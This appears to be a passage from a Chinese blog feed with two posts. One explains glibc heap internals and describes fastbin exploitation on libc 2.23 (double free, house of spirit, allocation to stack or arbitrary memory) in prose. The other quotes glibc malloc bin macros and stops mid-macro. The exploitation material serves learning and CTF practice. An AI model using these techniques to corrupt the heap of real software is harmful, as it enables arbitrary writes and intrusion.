    <content type="html"><![CDATA[<h1 id="前半部分-：基于libc2-23（无tcache）"><a href="#前半部分-：基于libc2-23（无tcache）" class="headerlink" title="前半部分 ：基于libc2.23（无tcache）"></a>前半部分 ：基于libc2.23（无tcache）</h1><h3 id="堆机制-fastbin等"><a href="#堆机制-fastbin等" class="headerlink" title="堆机制(fastbin等)"></a>堆机制(fastbin等)</h3><p>想要了解堆机制利用方法必须要先了解堆的基本机制以及结构</p><p>目前主要使用的内存管理库是ptmalloc，而在ptmalloc中，用户请求的空间由名为chunk的数据结构表示</p><p>下面就是一个标准的chunk结构<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/1.jpg" alt="1.jpg"><br>该chunk中，prev_size参数为前一chunk的大小，size参数为该chunk的大小，而p参数（pre_insue）为标志位，标志前一个chunk的使用情况。而上述的三个参数组成了chunk的header部分，该部分一般不用被用户直接访问</p><p>用户能够访问的空间为mem部分，如果一个chunk正被使用，则data部分为用户存储的内存空间，此时fd、bk指针并无实际意义。如果一个chunk未被使用，则mem部分的fd与bk存储的分别是上一个和下一个未被使用的chunk的地址。而这样一个由未被使用的chunk组成的链表被称为bin。</p><p>一般而言，不同大小的free chunk会被分类到不同的bin中，而bin的类型可以被分为fast bin，small bin，large Bin和unsorted bin。其中，fast bin的操作效率较高，为单向链表，其它的都是双向链表。较高的操作效率意味着较低的安全性，所以fastbin机制产生的漏洞也是堆区漏洞的最重要组成部分之一。</p><p>诸多的bin链由指针进行管理与保存，数组里头装的就是不同大小的Bin链的头尾结点指针。</p><p>fastbinY数组：大小为10，为fastbin的专用数组<br>bins数组：大小为129，其中unsorted bin占1，small bin占2<del>63，large bin占64</del>126</p><p>bin数组的结构大致如图<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/1.png" alt="1.png"><br>而我们的fastbinY数组为了追求效率，直接舍弃了对bk指针的管理，是fastbin形成了一个单链表结构（而非一般的双链表），在进行添加删除操作时使用的 是LIFO原则，结构大致如图。<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/2.png" alt="2.png"><br>而fastbin的高效体现在什么地方呢？</p><p>默认情况下，对于size_t为4B的平台，小于64B的chunk分配请求；对于size_t为8B的平台，小于64B的chunk分配请求；对于size_t为8B的平台，小于128B的chunk分配请求，程序会根据所需的size首先到fastbin中去寻找对应大小的bin中是否包含未被使用的chunk，如果有，则直接从bin中返回chunk。而释放chunk时，也根据chunk的size参数计算fastbin中对应的index，如果存在对应的大小，就将chunk直接插入对应的bin中。</p><p>32位平台size_t长度为4字节，64位平台的size_t长度可能是4字节，也可能是8字节，64位linux平台size_t长度为8字节</p><p>而且为了追求效率,fastbin不仅使用单链表进行维护，由fastbin管理的chunk即使在被释放后chunk的p参数也不会被重置，而且在释放时只会对链表指针头部的chunk进行校验。</p><p>以下图为例，在释放掉chunk1之后，结构如图：<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/3.png" alt="3.png"><br>此时如果用户想再释放一次chunk1，程序会对单链表的头部chunk进行验证，发现用户对同一个chunk连续进行了两次释放操作，此时程序会报错并停止运行。</p><p>但是如果我们在释放chunk1之后释放一个chunk2，此时fastbin结构如图：<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/4.png" alt="4.png"><br>此时头结点就变成了chunk2，此时头结点就变成了chunk2，此时我们就可以对chunk1再一次进行释放操作，这就是fastbin攻击四类型的一种——double free攻击</p><h3 id="fastbin的攻击方式"><a href="#fastbin的攻击方式" class="headerlink" title="fastbin的攻击方式"></a>fastbin的攻击方式</h3><h5 id="1、double-free"><a href="#1、double-free" class="headerlink" title="1、double free"></a>1、double free</h5><p>当我们申请了两块chunk，分别命名为chunk1和chunk2，然后一次释放chunk1和chunk2，此时fastbin结构如图<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/5.png" alt="5.png"><br>此时我们利用fastbin的特性，再次释放chunk1，此时会将fastbinY数组的fd指针指向chunk1，把chunk1的fd指针指向chunk2，导致最先进入fastbin的chunk1本应指向0x00的fd指针指向chunk2，此时chunk块结构如图：<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/6.png" alt="6.png"><br>此时我们如果再次申请一块大小与chunk1大小相同的堆块，我们就能从fastbin中取出chunk1，并对chunk1的fd指针进行修改。注意此时当chunk1的fd被修改后，整个单链表的表尾就指向了修改后的fd，此时先连续malloc两次，把chunk2与chunk1一次取出，在下一次malloc的时候，我们就可以在我们指定的地址申请堆块，间接实现了任意地址写操作。（前提：需要操作目标地址使得size通过fastbin的校验）</p><h5 id="2、house-of-spirit"><a href="#2、house-of-spirit" class="headerlink" title="2、house of spirit"></a>2、house of spirit</h5><p>其实感觉house of spirit和double free方法大差不差，只不过更仔细地说明了fake chunk的格式要求，并且修改的不适指定地址的内容，而是指定位置的前后内容。</p><p>要想构造fastbin fake chunk，并且将其释放时，可以将其放入到对应的fastbin链表中，需要绕过一些必要的检测，即</p><p>①fake chunk的ISMMAP位不能为1，因为free时，如果是mmap的chunk，会单独处理<br>②fake chunk地址需要对齐，malloc_align_mask<br>③fake chunk的size大小需要满足对应的fastbin的需求，同时也得对齐。<br>④fake chunk的next chunk大小不能小于2*SIZE_SZ，同时也不能大于av-&gt;system_mem。<br>⑤fake chunk对应的fastbin链表头部不能是该fake chunk，即不能构成double free的情况。</p><p>可以看出，想要使用该技术分配到指定的地址，其实并不需要修改指定指定地址的任何内容，关键是要能够修改指定地址前后的内容使其绕过对应的检测。</p><h5 id="3、alloc-to-stack"><a href="#3、alloc-to-stack" class="headerlink" title="3、alloc to stack"></a>3、alloc to stack</h5><p>原理与前二者基本相同，还是戒尺fastbin链表中的chunk的fd指针（除了double free，还可以用堆溢出等技巧），从而把chunk分配到栈上，从而控制栈上的关键数据（如校验值或者关键的返回地址），当然同时需要栈上存在有满足条件的size值。</p><h5 id="4、arbitrary-alloc"><a href="#4、arbitrary-alloc" class="headerlink" title="4、arbitrary alloc"></a>4、arbitrary alloc</h5><p>arbitrary alloc其实alloc to stack是完全相同的，唯一的区别是分配的目标不再是栈中。事实上只要满足目标地址存在合法的size域（这个size域是构造的，还是自然存在的都无妨），我们可以把chunk分配到任意的可写内存中，比如bss、heap、data、stack等等。</p><p>写到这里，这个fastbin机制的漏洞利用方式已经基本上讲完了（当然是基于libc2.23的）。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Bin</title>
    <link href="/2021/06/14/bin/"/>
    <url>/2021/06/14/bin/</url>
    
    <content type="html"><![CDATA[<h3 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h3><p>大多数程序经常会申请以及释放比较小的内存块。如果将一些较小的chunk释放之后发现存<br>在与之相邻的空闲chunk并将它们进行合并，那么当下一次再次申请相应大小的chunk时，<br>就需要对chunk进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了<br>合并、分割以及中间检查的过程中。因此,ptmalloc中专门设计了fastbin，对应的变量就是<br>malloc state中的fastbinY</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   Fastbins</span><br><span class="line"></span><br><span class="line">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="line">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="line">    since chunks are never removed from the middles of these lists,</span><br><span class="line">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="line">    are not even processed <span class="keyword">in</span> FIFO order (they use faster LIFO) since</span><br><span class="line">    ordering doesn<span class="string">&#x27;t much matter in the transient contexts in which</span></span><br><span class="line"><span class="string">    fastbins are normally used.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="string">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="string">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="string">    other free chunks.</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">typedef struct malloc_chunk *mfastbinptr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">    This is in malloc_state.</span></span><br><span class="line"><span class="string">    /* Fastbins */</span></span><br><span class="line"><span class="string">    mfastbinptr fastbinsY[ NFASTBINS ];</span></span><br><span class="line"><span class="string">*/</span></span><br></pre></td></tr></table></figure><p>为了更加高效地利用fastbin，glibc采用单向链表对其中的每一个Bin进行组织，并且每个<br>bin采取LIFO，最近释放的chunk会更早地被分配，所以会增加适用于局部性。也就是说，<br>当用户需要的chunk的大小小于fastbin的最大大小时，ptmalloc会首先判断fastbin中相应<br>的bin中是否有对应大小的空闲块，如果有的话，就去直接从这个bin中获取chunk。如果<br>没有的话，Ptmalloc才会做接下来的一系列操作。</p><p>默认情况下（32位系统为例），fastbin中默认支持最大的chunk的数据空间大小为64字节。<br>但是其可以支持的chunk的数据空间最大为80字节。除此之外，fastbin最多可以支持的Bin<br>的个数为10个，从数据空间为8个字节开始一直到80字节（主义这里说的是数据空间大小，<br>也即除去prev_size和size字段部分的大小）定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEFAULT_MXFAST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MXFAST (64 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Since the lowest 2 bits in max_fast don&#x27;t matter in size comparisons,</span></span><br><span class="line"><span class="comment">   they are used as flags.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span></span><br><span class="line"><span class="comment">   some fastbin chunks. It is set true on entering a chunk into any</span></span><br><span class="line"><span class="comment">   fastbin, and cleared only in malloc_consolidate.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The truth value is inverted so that have_fastchunks will be true</span></span><br><span class="line"><span class="comment">   upon startup (since statics are zero-filled), simplifying</span></span><br><span class="line"><span class="comment">   initialization checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//判断分配区是否有 fast bin chunk，1表示没有</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">   regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">   when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// MORECORE是否返回连续的内存区域。</span></span><br><span class="line"><span class="comment">// 主分配区中的MORECORE其实为sbr()，默认返回连续虚拟地址空间</span></span><br><span class="line"><span class="comment">// 非主分配区使用mmap()分配大块虚拟内存，然后进行切分来模拟主分配区的行为</span></span><br><span class="line"><span class="comment">// 而默认情况下mmap映射区域是不保证虚拟地址空间连续的，所以非主分配区默认分配非连续虚拟地址空间。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span></span><br><span class="line"><span class="comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span></span><br><span class="line"><span class="comment">   allocated in that arena before detecting corruption are not freed.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Set value of max_fast.</span></span><br><span class="line"><span class="comment">   Use impossibly small value if 0.</span></span><br><span class="line"><span class="comment">   Precondition: there are no existing fastbin chunks.</span></span><br><span class="line"><span class="comment">   Setting the value clears fastchunk bit but preserves noncontiguous bit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s)                                                        \</span></span><br><span class="line">    global_max_fast =                                                          \</span><br><span class="line">        (((s) == <span class="number">0</span>) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_max_fast() global_max_fast</span></span><br></pre></td></tr></table></figure><p>ptmalloc默认情况下会调用set_max_fast(s)将全局变量global_max_fast设置为DEFAULT_<br>MXFAST,也就是设置fast bins 中chunk的最大值。当MAX_FAST_SIZE被设置为0时，系统<br>就不会支持fastbin。</p><p><strong>fastbin的索引</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="line">// chunk size=2*size_sz*(2+idx)</span><br><span class="line">// 这里要减2，否则的话，前两个bin没有办法索引到。</span><br><span class="line"><span class="comment">#define fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure><p>需要特别注意的是，fastbin范围的chunk的inuse始终被置为1。因此它们不会和其它被释放<br>的chunk合并。<br>但是当释放的chunk与该chunk相邻的空闲chunk合并后的大小大于FASTBIN_CONSOLIDATION_<br>THRESHOLD时，内存碎片可能比较多了，我们就需要把fastbins中的chunk都进行合并，<br>以减少内存碎片对系统的影响。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk <span class="keyword">in</span> free()</span><br><span class="line">   that triggers automatic consolidation of possibly-surrounding</span><br><span class="line">   fastbin chunks. This is a heuristic, so the exact value should not</span><br><span class="line">   matter too much. It is defined at half the default trim threshold as a</span><br><span class="line">   compromise heuristic to only attempt consolidation <span class="keyword">if</span> it is likely</span><br><span class="line">   to lead to trimming. However, it is not dynamically tunable, since</span><br><span class="line">   consolidation reduces fragmentation surrounding large chunks even</span><br><span class="line">   <span class="keyword">if</span> trimming is not used.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span></span><br></pre></td></tr></table></figure><p>malloc_consolidate函数可以将fastbin中所有能和其它合并的chunk合并在一起。<br>具体地参见后续的详细函数的分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="comment">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="comment">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="comment">    other free chunks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>small bin</strong><br>small bins中每个chunk的大小与其所在的bin的index的关系为：chunk_size=2*SIZE_SZ<br>*index，具体如下</p><hr><p>下标          SIZE_SZ=4(32位)          SIZE_SZ=8(64位)<br>2                     16                                  32<br>3                     24                                  48<br>4                     32                                  64<br>5                     40                                  80<br>x                     2<em>4</em>x                              2<em>8</em>x<br>63                   504                                1008</p><hr><p>small bins中一共有62个循环双向链表，每个链表中存储的chunk大小都一致。比如对于32<br>位系统来说，下标2对应的双向链表中存储的chunk大小均为16个字节。每个链表都有链表头<br>结点，这样可以方便对于链表内部结点的管理。此外，small bins中每个Bin对应的链表采用<br>FIFO的规则，所以同一个链表中先被释放的chunk会先被分配出去。</p><p>small bin相关的宏如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment">// 是否需要对small bin的下标进行纠正</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"><span class="comment">//判断chunk的大小是否在small bin范围内</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)                                                  \</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br><span class="line"><span class="comment">// 根据chunk的大小得到small bin对应的索引。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz)                                                     \</span></span><br><span class="line">    ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>)                          \</span><br><span class="line">                           : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>)) +                       \</span><br><span class="line">     SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure><p>或许，大家会很疑惑，那fastbin与smallbin中的大小会有很大一部分重合啊，那smallbin中<br>对应大小的bin是不是就没有什么作用啊？其实不然，fastbin中的chunk是有可能被放到<br>smallbin中去的，我们在后面分析具体的源代码时会有深刻体会。</p><h3 id="Largebin"><a href="#Largebin" class="headerlink" title="Largebin"></a>Largebin</h3><p>largebins中一共包括63个bin，每一个bin中的chunk的大小不一致，而是处于一定区间范围<br>内。此外，这63个bin被分成了6组，每组bin中的chunk大小之间的公差一致，具体如下：</p><hr><p>组                     数量                 公差<br>1                        32                   64B<br>2                        16                   512B<br>3                         8                    4096B<br>4                         4                    32768B<br>5                         2                    262144B<br>6                         1                    不限制</p><hr><p>这里我们以32位平台的largebin为例，第一个largebin的起始chunk大小为512个字节，位于<br>第一组，所以该bin可以存储的chunk的大小范围为[512,512+64)</p><p>关于large bin的宏如下，这里我们以32位平台下，第一个largebin的起始chunk大小为例子，<br>为512字节，那么512&gt;&gt;6=8，所以其下标为56+8=64。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                                  \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>)                                     \</span><br><span class="line">         ? <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                              \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>)                                     \</span><br><span class="line">         ? <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                  \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>)                                     \</span><br><span class="line">         ? <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span 